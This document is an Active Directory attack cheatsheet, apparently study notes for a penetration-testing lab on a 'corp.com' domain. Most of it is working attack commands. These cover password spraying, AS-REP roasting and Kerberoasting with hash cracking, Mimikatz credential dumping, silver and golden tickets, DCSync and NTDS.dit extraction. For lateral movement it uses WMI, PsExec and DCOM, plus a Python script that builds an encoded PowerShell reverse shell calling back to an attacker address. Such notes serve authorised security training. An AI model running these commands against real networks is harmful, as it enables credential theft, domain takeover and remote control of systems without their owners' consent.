# Active Directory Cheatsheet

**RDP Access**: `xfreerdp /u:stephanie /p:Password@1 /v:192.168.186.75 /d:corp.com /w:1280 /h:270`

Domain Users and Groups

* `net user /domain`
* `net user jeff /domain`
* `net group /domain`
* `net group "Domain Admins" /domain`

**Primary Domain Controller**: `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`

### Kerberos Authentication procedure

Key Words:

* Authentication Server Request (AS-REQ): timestamp that is encrypted using a hash derived from the password of the user + username
* Authentication Server Reply (AS-REP):  contains a session key and a Ticket Granting Ticket (TGT)
* Ticket Granting Service Request (TGS-REQ): consists of the current user and a timestamp encrypted with the session key, the name of the resource, and the encrypted TGT
* Ticket Granting Server Reply (TGS-REP): name of the service + session key to be used between the client and the service + service ticket containing the username and group memberships
* Application Request (AP-REQ): includes the username and a timestamp encrypted with the session key associated with the service ticket

### PowerView

```powershell
C:\Users\Public> powershell -ep bypass
PS C:\Users\Public> Import-Module .\PowerView.ps1
```

**Cheatsheet for Powerview**

* `Get-NetDomain`: Basic Info on the domain
* `Get-NetUser`: Info on the domain users
* `Get-NetUser user`: Info on specific domain user
* `Get-NetUser | select cn`: User Domain names
* `Get-NetGroup | select samaccountname,member`: Info on the Domain groups and their members
* `Get-NetComputer`: Info on the pc in the domain
* `Get-NetComputer pcname`: Info on the specific pc 
* `Find-LocalAdminAccess`: tells any computer where compromised user has Administrative rights
* `Get-NetSession -ComputerName pcname -Verbose`: show whether a user is connected to the pcname
* `Get-Acl -Path resource_path`: Gives info on permissions for a specific resource
* `Get-ObjectAcl -Identity identityname`: enumerate Access Control Entries
* `Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`
* `Get-ObjectAcl -Identity "GroupName" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`: Show objects that have the GenericAll set for the specified Identity
* `Find-DomainShare`: Enumerates all the shares in the domain

**Object's Permissions**

* **GenericAll**: Full permissions on object
* **GenericWrite**: Edit certain attributes on the object
* **WriteOwner**: Change ownership of the object
* **WriteDACL**: Edit ACE's applied to object
* **AllExtendedRights**: Change password, reset password, etc.
* **ForceChangePassword**: Password change for object
* **Self (Self-Membership)**: Add ourselves to for example a group

**Group Policy Password Decryption**

Usually you can find policies backup in the SYSVOL share on the Domain Controller

```bash
kali@kali: gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

### Password Attacks

**Inspect Password Policy**: `net accounts`

Crackmap Exec with SMB protocol:

1. Password Spray:
    ```bash
    crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
    ```
2. List shares:
    ```bash
    crackmapexec smb 192.168.50.75 -u celia.almeda -p 'Nexus123!' -d corp.com --shares
    ```
3. Password Policy
    ```bash
    crackmapexec smb 192.168.50.75 -u celia.almeda -p 'Nexus123!' -d corp.com --pass-pol
    ```

*Crackmap doesn't evaluate the policy, be cautious with account lockouts.*

Crackmap adds **"Pwn3d!"** to the output, indicating that user has administrative privileges on the target system.

**Kerbrute**

```cmd
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

**AS-REP Roasting**

Needs authenticated user

Multi Platform:

* On Kali: `impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete`
* On Windows: `.\Rubeus.exe asreproast /nowrap`

To crack AS-REP Hashes: 

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Kerberoasting**

Multi Platform:

* On Kali: `sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete` 
* On Windows: `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`

To crack TGS-REP Hashes: 

```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Mimikatz

*Mimikatz needs Administrator privileges to run*

[Hacktricks Mimikatz](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

Silver Tickets

1. `privilege::debug`
2. `sekurlsa::logonpasswords`
3. `whoami /user` to retrieve Domain SID
4. `kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`

`iwr -UseDefaultCredentials http://web04` for iis_service user

**Domain Controller Synchronization**

We need a user that is a member of *Domain Admins, Enterprise Admins, or Administrators groups*.

`lsadump::dcsync /user:domain\user`

With impacket suite: 

```bash
impacket-secretsdump -just-dc-user target_user corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@DC-IP
```

### SharpHound & BloodHound

Powershell Version:

```powershell
C:\Users\Public> powershell -ep bypass
PS C:\Users\Public> Import-Module .\SharpHound.ps1
PS C:\Users\Public> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\pete\Desktop\ -OutputPrefix "audit"
```

BloodHound Queries:

* MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
* MATCH (m:Computer) RETURN m
* MATCH (m:User) RETURN m

### Lateral Movement

**WMI Powershell Script** [needs Local Administrator Group Credentials]

```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.186.72 -Credential $credential -SessionOption $Options 
$command = 'base64 encoded reverse shell';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

In order to obtain the encoded powershell command run `python3 wmi.py`

```python
import sys
import base64
payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.186",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
```

**Winrs solution**

`winrs -r:files04 -u:jen -p:Nexus123! "powershell base64 encoded reverse shell"`

**PSExec**

Needs *Local Admin Group* and *Admin$* share enabled

* Impacket-Suite: `impacket-psexec corp/jen:'Nexus123!'@192.168.186.72`
* RDP: `./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd`

**Pass The Hash**

This will not work for Kerberos authentication but only for servers or services using NTLM authentication.

**Pass The Ticket**

Export Available tickets from mimikatz [needs Local Administrator Privileges]

```cmd
# sekurlsa::tickets /export
C:\Users\Public> dir *.kirbi
# kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
**DCOM**

Needs administrator powershell session

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET_IP"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell base64 encoded reverse shell","7")
```

**Golden Ticket**

* `lsadump::lsa /patch`
* `kerberos::purge`
* `kerberos::golden /user:jen /domain:corp.com /sid:DOMAIN_SID /krbtgt:krbtgt_password_hash /ptt`
* `PsExec.exe \\dc1 cmd.exe`

**Shadow Copy**

Needs Domain Admin member

* `vshadow.exe -nw -p  C:`
* `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
* `reg.exe save hklm\system c:\system.bak`

Then from Kali

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```